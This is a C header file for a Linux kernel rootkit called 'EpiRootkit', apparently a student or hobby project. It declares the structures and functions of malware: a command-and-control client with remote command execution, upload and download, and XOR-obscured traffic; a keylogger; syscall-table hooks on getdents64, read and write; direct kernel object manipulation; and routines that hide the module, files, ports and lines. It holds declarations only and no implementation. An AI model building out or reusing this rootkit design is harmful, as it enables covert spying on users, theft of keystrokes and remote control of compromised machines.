#ifndef EPIROOTKIT_H
#define EPIROOTKIT_H

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kthread.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/uaccess.h>
#include <linux/mm.h>
#include <linux/syscalls.h>
#include <net/sock.h>
#include <linux/dirent.h>
#include <linux/version.h>
#include <linux/namei.h>
#include <linux/cred.h>
#include <linux/input.h>
#include <linux/spinlock.h>
#include <linux/ctype.h>
#include <linux/jiffies.h>
#include <linux/delay.h>
#include <linux/list.h>
#include <linux/socket.h>

// Error codes
#define ROOTKIT_ERROR_FILE    1
#define ROOTKIT_ERROR_MEMORY  2
#define ROOTKIT_ERROR_NETWORK 3

// Constants
#define KEYLOG_BUFFER_SIZE 1024
#define MAX_HIDDEN_FILES 100
#define MAX_HIDDEN_PORTS 50

// Configuration structures
struct rootkit_config {
    int port;
    const char *server_ip;
    int buffer_size;
    const char *xor_key;
    const char *temp_output_file;
    const char *command_prefix_auth;
    const char *command_prefix_exec;
    const char *command_prefix_upload;
    const char *command_prefix_download;
    const char *command_prefix_keylog;
    int command_prefix_length;
    const char *shell_path;
    const char *shell_args;
    const char *path_env;
    const char *hidden_dir;
    int max_hidden_lines;
    const char *command_prefix_hide_line;
    const char *command_prefix_unhide_line;
};

struct keylog_config {
    int buffer_size;
    unsigned long flush_interval;
};

// Memory management structure
struct memory_manager {
    void *nonpaged_memory;
    size_t nonpaged_size;
    spinlock_t lock;
};

struct network_manager {
    struct socket *connection;
    bool is_connected;
    spinlock_t lock;
    struct task_struct *thread;
};

struct hook_entry {
    void *target;
    void *original;
    struct list_head list;
};

struct dkom_entry {
    void *target;
    void *original;
    size_t size;
    struct list_head list;
};

// Global variables
extern struct rootkit_config config;
extern struct keylog_config keylog_config;
extern struct memory_manager mem_manager;
extern struct network_manager net_manager;
extern struct list_head dkom_entries;
extern struct list_head hook_entries;
extern spinlock_t hook_lock;
extern spinlock_t dkom_lock;
extern struct task_struct *g_stealth_thread;
extern unsigned long *sys_call_table;
extern asmlinkage long (*original_getdents64)(const struct pt_regs *);
extern asmlinkage long (*original_read)(const struct pt_regs *);
extern asmlinkage long (*original_write)(const struct pt_regs *);
extern char keylog_buffer[KEYLOG_BUFFER_SIZE];
extern int keylog_buffer_index;
extern struct list_head module_list;
extern bool module_hidden;

// Function declarations
void dkom_restore_object(struct dkom_entry *entry);
void remove_hook(struct hook_entry *entry);
void send_error(int error_code, const char *message);
void send_data(const char *data);
void apply_xor_cipher(char *data, int len);
void process_command(const char *command);
void free_secure_memory(void *ptr, size_t size);
void unhide_module(void);
void keylog_buffer_cleanup(void);
int keylog_thread(void *data);
int stealth_thread(void *data);
void xor_cipher(char *data, int length);
void hide_line(const char *filename, unsigned long line);
void unhide_line(const char *filename, unsigned long line);
bool is_line_hidden(const char *filename, unsigned long line);
void send_keylog_data(void);
void hide_module(void);

#endif // EPIROOTKIT_H 